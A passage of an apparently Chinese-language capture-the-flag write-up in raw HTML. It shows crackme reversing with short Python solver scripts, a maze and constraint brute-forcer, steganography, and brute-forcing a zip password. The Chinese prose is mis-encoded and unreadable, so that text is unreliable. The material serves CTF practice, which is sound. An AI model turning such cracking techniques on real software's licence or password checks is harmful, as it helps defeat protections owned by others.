class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(l2)):</span><br><span class="line">s=f_all[l1[i]:l1[i+<span class="number">1</span>]]</span><br><span class="line">fname=l2[i]</span><br><span class="line"><span class="comment">#gzæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r&#x27;out\%d.gz&#x27;</span> %fname,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(s)</span><br><span class="line">fname_list.append(fname)</span><br><span class="line">fname_list.sort() <span class="comment">#ä»å°åˆ°å¤§æ’åº</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> fname <span class="keyword">in</span> fname_list:</span><br><span class="line">flag+=gzip.open(<span class="string">r&#x27;out\%d.gz&#x27;</span> %fname,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">foo()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:33:51%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:33:51%20"></a></p><h2 id="æŒ£è„±ç‰¢ç¬¼"><a href="#æŒ£è„±ç‰¢ç¬¼" class="headerlink" title="æŒ£è„±ç‰¢ç¬¼"></a>æŒ£è„±ç‰¢ç¬¼</h2><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Waring-Up-100"><a href="#Waring-Up-100" class="headerlink" title="Waring Up(100)"></a>Waring Up(100)</h2><blockquote><p>Warming Up</p></blockquote><p>Crack the easy program crackme, the key is your correct inpu</p><p>Crack the easy program crackme, the key is your correct input<br>ç›´æ¥IDAæ‰“å¼€ï¼Œæ¥åˆ°main_0()ï¼Œç¨‹åºä¸»æµç¨‹åœ¨è¿™æ­¤å‡½æ•°é‡Œ</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:37:08%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:37:08%20"></a></p><p>v4è·å–è¾“å…¥ï¼Œv3ä¸ºè¾“å…¥å­—ä¸²é•¿åº¦ï¼Œç„¶åè¿›sub_401005()è¿›è¡Œå­—ä¸²å¤„ç†ï¼Œsub_40100A()ä¸ºç»“æœæ¯”è¾ƒã€‚å…ˆçœ‹ä¸‹ç»“æœæ¯”è¾ƒå‡½æ•°ï¼š</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:39:04%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:39:04%20"></a></p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:40:05%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:40:05%20"></a></p><p>å¯ä»¥çœ‹å‡ºï¼Œå¤„ç†è¿‡çš„è¾“å…¥ä¸â€VgobmndVlBVEâ€å®˜ä¸²æ¯”è¾ƒã€‚<br>å†çœ‹è¾“å…¥å­—ä¸²å¤„ç†å‡½æ•°ï¼Œsub_401005()ç›´æ¥è·³åˆ°åœ°å€40DBF0ã€‚<br>å…³é”®å¤„ç†æ“ä½œå¦‚å›¾ï¼š</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:41:33%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:41:33%20"></a></p><p>å†™ä¸ªå°è„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">&quot;VgobmndVlBVE&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> index, item <span class="keyword">in</span> enumerate(target):</span><br><span class="line">result += chr(ord(item)^(((index)%<span class="number">3</span>)+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆ°æ‰‹çš„é’¥åŒ™-100"><a href="#åˆ°æ‰‹çš„é’¥åŒ™-100" class="headerlink" title="åˆ°æ‰‹çš„é’¥åŒ™(100)"></a>åˆ°æ‰‹çš„é’¥åŒ™(100)</h2><blockquote><p>åˆ°æ‰‹çš„é’¥åŒ™ã€‚ç°åœ¨å·²ç»ç¡®å®šæˆªè·åˆ°ä¸€ä¸ªå¯¹æ–¹ç”¨æ¥ä¼ é€’å¯†é’¥çš„ç¨‹åºï¼Œä½†æ˜¯å¦‚ä½•æ‰èƒ½æ‹¿åˆ°å¯†é’¥ï¼Ÿ</p></blockquote><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:43:39%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:43:39%20"></a></p><p>ä¸€ä¸ªæ˜¯å¸å· ä¸€ä¸ªæ˜¯å¯†ç </p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:44:48%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:44:48%20"></a></p><p>å±å¹•è¾“å‡ºä¸€å †å¥‡æ€ªçš„ä¸œè¥¿<br>å¸å·+å¯†ç +è¿™ä¸€å †  å°±æ˜¯flagäº†</p><h2 id="å¿˜è®°ç”¨æˆ·å-100"><a href="#å¿˜è®°ç”¨æˆ·å-100" class="headerlink" title="å¿˜è®°ç”¨æˆ·å(100)"></a>å¿˜è®°ç”¨æˆ·å(100)</h2><blockquote><p>å¿˜è®°ç”¨æˆ·åã€‚è¿‡äº†å¥½ä¹…ï¼Œç”¨æˆ·åéƒ½ä¸è®°å¾—äº†ï¼Œéš¾é“åªèƒ½é‡ç½®äº†ä¹ˆ</p></blockquote><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:55:34%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:55:34%20"></a></p><p> åšäº†ç®€å•çš„åŠ å‡</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;ILoveXD&#x27;</span></span><br><span class="line">ct=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</span><br><span class="line"> <span class="keyword">print</span> chr(ord(c)+<span class="number">7</span>-ct)</span><br><span class="line"> ct=ct+<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="Help-me-150"><a href="#Help-me-150" class="headerlink" title="Help me(150)"></a>Help me(150)</h2><blockquote><p>Help me</p></blockquote><p>Whatâ€™s wrong with my program? Who can crack this? Do me a favorâ€¦</p><p>ç›´æ¥æ‰”è¿›IDAï¼Œå¦‚å›¾ï¼š</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:11%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:11%20"></a></p><p>å…¶ä¸­æœ‰äº›ç©ºä»£ç ï¼Œè¿˜æœ‰äº›ä¸å¤ªæ­£ç¡®çš„è¯­å¥ã€‚ç¨‹åºæ˜¯ä¸èƒ½æ­£å¸¸è¿è¡Œçš„ã€‚å¦‚å¼€å§‹å¤„çš„v10,v0ç­‰ã€‚main()å‡½æ•°ä¸­å‰é¢ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯ä¸€äº›æ‰“å°è¯­å¥ï¼Œæ±‚å­—ä¸²é•¿åº¦åŠä¸€äº›èµ‹å€¼æ“ä½œã€‚è¿™é‡Œæœ‰å››ä¸ªèµ‹å€¼ä¸‹é¢éœ€è¦ç”¨åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_40CF70 &#x3D; 1;</span><br><span class="line">dword_40CF74 &#x3D; -1;</span><br><span class="line">dword_40CF78 &#x3D; -2;</span><br><span class="line">v3 &#x3D; lstrlenA(String);</span><br></pre></td></tr></table></figure><p>å†çœ‹ä¸‹é¢çš„ifè¯­å¥</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:40%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:40%20"></a></p><p>ç¬¬ä¸€ä¸ªifä¸­çš„v3ä¸ºStringçš„é•¿åº¦ï¼ŒStringä¸ºâ€™rev3rs3_ana1ys1sâ€™ã€‚é‡Œé¢æ˜¯ä¸€ä¸ªdoâ€¦whileè¯­å¥ï¼Œé‡Œé¢æ˜¯ä¸€äº›if è¯­å¥ï¼Œæ ¹æ®ä¸Šé¢åˆ—å‡ºçš„èµ‹å€¼è¯­å¥ï¼Œç›´æ¥åˆ°è¾¾ä¸‹å›¾çš„å…³é”®å­—ä¸²å¤„ç†éƒ¨åˆ†ï¼š</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:00:01%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:00:01%20"></a></p><p>ç°åœ¨é€»è¾‘å°±å¾ˆæ¸…æ™°äº†<br>å­—ä¸²ä¸9å¼‚æˆ–ï¼Œä»¥16è¿›åˆ¶å½¢å¼è¾“å‡ºç»“æœã€‚ç”¨pythonè®¡ç®—ç»“æœå¦‚å›¾</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:10:48%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:10:48%20"></a></p><h2 id="æ‰è¿·è—-150"><a href="#æ‰è¿·è—-150" class="headerlink" title="æ‰è¿·è—(150)"></a>æ‰è¿·è—(150)</h2><blockquote><p>æ‰è¿·è—ã€‚æ–‡ä»¶ä¸€å®šè¦ä¿å­˜å¥½ï¼Œä¸è¦åƒè¿™ä¸ªç¨‹åºä¸€æ ·éšä¾¿ä¸€diu~  PSï¼šå»ºè®®åœ¨win32ç¯å¢ƒä¸‹æµ‹è¯•</p></blockquote><p>ç”¨IDAæ‰“å¼€ èƒ½çœ‹åˆ°ç”¨æˆ·å</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:13:38%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:13:38%20"></a></p><p>å¯†ç éšä¾¿è¾“å…¥14ä¸ª1ï¼Œå‘ç°14ä¸ª1å˜ä¸ºbase64ç¼–ç å’Œå¦ä¸€ä¸²æ¯”<br>ä¸‹æ–­ç‚¹å¾—åˆ°base64çš„ç¼–ç ï¼Œè§£ç å¾—åˆ°OnYourComputer</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:15:19%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:15:19%20"></a></p><p>sub_13D1D00å†…ä¼šæŠŠç”¨æˆ·å+å¯†ç +ArvinShowå­˜åˆ°<br>ç³»ç»Ÿä¸´æ—¶ç›®å½•/flag.jpgï¼Œflagå³ä¸º</p><p><code>FindKeyOnYourComputerArvinShow</code></p><h2 id="ç§»åŠ¨è¿·å®«-200"><a href="#ç§»åŠ¨è¿·å®«-200" class="headerlink" title="ç§»åŠ¨è¿·å®«(200)"></a>ç§»åŠ¨è¿·å®«(200)</h2><blockquote><p>ç§»åŠ¨è¿·å®«ã€‚å½“èµ¶åˆ°çš„æ—¶å€™å‘ç°å¯¹æ–¹å·²ç»æå‰æ¥å¤´äº†ï¼Œä½†åœ¨ç°åœºé—ç•™äº†ä¸€ä¸ªUç›˜å¹¶æ¢å¤å‡ºäº†ä¸€ä¸ªç™»é™†ç¨‹åºï¼Œå¦‚ä½•æ‰èƒ½æ‹¿åˆ°å¯†é’¥ï¼Ÿ</p></blockquote><p>ç¨‹åºå°±æ˜¯ä¸ªç®€å•çš„èµ°è¿·å®«<br>è¾“å…¥çš„ä¸œè¥¿ï¼Œè¿›è¡Œå„ç®€å•å˜åŒ–ï¼Œå¯¹åº”äºèµ°çš„æ–¹å‘</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:21:11%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:21:11%20"></a></p><p>èµ°çš„é€»è¾‘æ˜¯</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:22:02%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:22:02%20"></a></p><p>æ ¹æ®åæ ‡ç”Ÿæˆæ–¹å‘å³å¯ï¼Œé€†ä»£ç å¦‚ä¸‹</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">map_info = <span class="string">&quot;***********####******#**#*****##*##********#*********#*#####***###***#*********#*********#********##&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pos_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(map_info)):</span><br><span class="line">result += map_info[i]</span><br><span class="line"></span><br><span class="line">y = (i)%<span class="number">10</span></span><br><span class="line">x = i/<span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">result += <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="keyword">if</span> map_info[i] == <span class="string">&quot;#&quot;</span>:</span><br><span class="line">pos_list.append((x, y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> map_info[<span class="number">0x28</span>]</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> pos_list</span><br><span class="line"></span><br><span class="line">last = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">way_list = []</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">-1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">-1</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(way_list)</span><br><span class="line">map_dic = &#123;&#125;</span><br><span class="line">map_dic[(<span class="number">-1</span>, <span class="number">0</span>)] = <span class="number">3</span></span><br><span class="line">map_dic[(<span class="number">1</span>, <span class="number">0</span>)] = <span class="number">4</span></span><br><span class="line">map_dic[(<span class="number">0</span>, <span class="number">-1</span>)] = <span class="number">1</span></span><br><span class="line">map_dic[(<span class="number">0</span>, <span class="number">1</span>)] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> way_list:</span><br><span class="line">result.append(map_dic[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">way_key = <span class="string">&quot;&quot;&quot;0A1B</span></span><br><span class="line"><span class="string">a2b3</span></span><br><span class="line"><span class="string">4C5D</span></span><br><span class="line"><span class="string">c6d7</span></span><br><span class="line"><span class="string">8E9F</span></span><br><span class="line"><span class="string">e0f1&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">way_key = way_key.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> len(result)</span><br><span class="line">result_info = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">result_info += way_key[j][result[i*<span class="number">6</span>+j]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> way_key</span><br><span class="line"><span class="keyword">print</span> result_info</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:25:54%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:25:54%20"></a></p><h2 id="Do-something-200"><a href="#Do-something-200" class="headerlink" title="Do something(200)"></a>Do something(200)</h2><blockquote><p>Do somethingç™»å½•ç¨‹åºåæ”¶åˆ°äº†ä¸€å¼ å›¾ç‰‡ï¼Œè¿™å…¶ä¸­ä¼šæœ‰ä»€ä¹ˆè¹Šè··ï¼Ÿå·²æ›´æ–°ï¼Œå¯ä»¥ç»§ç»­åšé¢˜ï½binwalkä»pngä¸­åˆ†ç¦»exe</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ç¨‹åºè®©è¾“å…¥ç”¨æˆ·å ç¬¦åˆä¸€ç³»åˆ—æ¡ä»¶</span><br><span class="line">a1&#x3D;a9</span><br><span class="line">a1&#x3D;aa</span><br><span class="line">a2&#x3D;ab</span><br><span class="line">a3&#x3D;a5</span><br><span class="line">a4&#x3D;a6</span><br><span class="line">ac&#x3D;5</span><br><span class="line">a8&#x3D;3*a 24</span><br><span class="line">ad&gt;5*a 4b</span><br><span class="line">ae&#x3D;2*a 1a</span><br><span class="line">a4&gt;3*a 27</span><br><span class="line">a1&gt;a4</span><br><span class="line">21&gt;a1</span><br><span class="line">a1&#x3D;ad+a7</span><br><span class="line">a7&#x3D;2*a 20</span><br><span class="line">a3&gt;4*a 3c</span><br><span class="line">a7&gt;a3</span><br><span class="line">a3%3&#x3D;0</span><br><span class="line">a2&gt;7</span><br><span class="line">a3&gt;a2</span><br></pre></td></tr></table></figure><p>å†™ç»™è„šæœ¬è·‘ä¸€ä¸‹ </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">a1=<span class="number">0</span></span><br><span class="line">a2=<span class="number">0</span></span><br><span class="line">a3=<span class="number">0</span></span><br><span class="line">a4=<span class="number">0</span></span><br><span class="line">a5=<span class="number">0</span></span><br><span class="line">a6=<span class="number">0</span></span><br><span class="line">a7=<span class="number">0</span></span><br><span class="line">a8=<span class="number">0</span></span><br><span class="line">a9=<span class="number">0</span></span><br><span class="line">a10=<span class="number">0</span></span><br><span class="line">a11=<span class="number">0</span></span><br><span class="line">a12=<span class="number">5</span></span><br><span class="line">a13=<span class="number">0</span></span><br><span class="line">a14=<span class="number">0</span></span><br><span class="line">a15=<span class="number">0</span></span><br><span class="line">a16=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line"> <span class="keyword">if</span> <span class="number">0x15</span>&lt;=a1:</span><br><span class="line">  <span class="keyword">continue</span></span><br><span class="line"> a9=a1</span><br><span class="line"> a10=a1</span><br><span class="line"> <span class="keyword">for</span> a2 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">  a11=a2</span><br><span class="line">  <span class="keyword">if</span> a2&lt;=<span class="number">7</span>:</span><br><span class="line">   <span class="keyword">continue</span></span><br><span class="line">  <span class="keyword">for</span> a3 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">   <span class="keyword">if</span> a3%<span class="number">3</span>!=<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">   a5=a3</span><br><span class="line">   <span class="keyword">if</span> a3&lt;=a2:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">   <span class="keyword">for</span> a4 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">    a6=a4</span><br><span class="line">    <span class="keyword">if</span> a1&lt;=a4:</span><br><span class="line">     <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> a16 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">     a7=<span class="number">2</span>*a16</span><br><span class="line">     <span class="keyword">if</span> a1&gt;=a7:</span><br><span class="line">      ad=a1-a7</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">if</span> a7&lt;=a3:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">     a12=<span class="number">5</span></span><br><span class="line">     <span class="keyword">if</span> <span class="number">1</span>==<span class="number">1</span>:</span><br><span class="line">      a8=<span class="number">3</span>*a12</span><br><span class="line">      <span class="keyword">for</span> a13 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">       a14=<span class="number">2</span>*a13</span><br><span class="line">       <span class="keyword">if</span> a4&lt;=<span class="number">3</span>*a13:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">       <span class="keyword">for</span> a15 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">        <span class="keyword">if</span> a13&lt;=<span class="number">5</span>*a15:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> a3&lt;=<span class="number">4</span>*a15:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">print</span> chr(a1+<span class="number">96</span>)+chr(a2+<span class="number">96</span>)+chr(a3+<span class="number">96</span>)+chr(a4+<span class="number">96</span>)+chr(a5+<span class="number">96</span>)+chr(a6+<span class="number">96</span>)+chr(a7+<span class="number">96</span>)+chr(a8+<span class="number">96</span>)+chr(a9+<span class="number">96</span>)+chr(a10+<span class="number">96</span>)+chr(a11+<span class="number">96</span>)+chr(a12+<span class="number">96</span>)+chr(a13+<span class="number">96</span>)+chr(a14+<span class="number">96</span>)+chr(a15+<span class="number">96</span>)+chr(a16+<span class="number">96</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ° </p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:36:03%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:36:03%20"></a></p><p>è®¿é—®ç¨‹åºå¾—åˆ°ä¸€ä¸ªåœ°å€  è®¿é—®åœ°å€  *<em><a href="http://reverse/">http://reverse</a>.****</em>.cn/galfehttonsisiht.php**<br>å°±èƒ½å¾—åˆ°flagäº†</p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="è’²å…¬è‹±çš„çº¦å®š"><a href="#è’²å…¬è‹±çš„çº¦å®š" class="headerlink" title="è’²å…¬è‹±çš„çº¦å®š"></a>è’²å…¬è‹±çš„çº¦å®š</h2><blockquote><p>è’²å…¬è‹±çš„çº¦å®š<br>100<br>é¢˜ç›®æè¿°ï¼Ÿå°å­¦ç¯±ç¬†æ—çš„ è’²å…¬è‹±~</p></blockquote><p>è¿™ä¸ªç®€å• ä½¿ç”¨stegsolveæ‰“å¼€</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:42:55%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:42:55%20"></a></p><p>èƒ½çœ‹åˆ°ä¸€ä¸ªäºŒç»´ç  </p><p>åè½¬ä¸€ä¸‹é¢œè‰² ç„¶å æ‰«æå°±å¾—åˆ°ä¸€ä¸ªç±»ä¼¼base64å­—ç¬¦ä¸²ï¼Œä½†å…¶å®æ˜¯base32å­—ç¬¦ä¸²ï¼Œç”¨pythonçš„base64.b32decodeå³å¯å¾—åˆ°flag</p><h2 id="ä»€ä¹ˆé¬¼-100"><a href="#ä»€ä¹ˆé¬¼-100" class="headerlink" title="ä»€ä¹ˆé¬¼(100)"></a>ä»€ä¹ˆé¬¼(100)</h2><blockquote><p>ä»€ä¹ˆé¬¼</p></blockquote><p>ä½ ç…å•¥ï¼Ÿ</p><p>binwalè§£å‹å‡ºä¸€ä¸ªå‹ç¼©åŒ…</p><p>å‹ç¼©åŒ…æ˜¯æœ‰å¯†ç çš„  æ³¨é‡Šä¸Šå†™çš„4ä½æ•°<br>çˆ†ç ´  å¾—åˆ°å¯†ç  19bZ<br>æ‰“å¼€å‹ç¼©åŒ…æ˜¯ä¸€ä¸ªç ´æŸçš„äºŒç»´ç  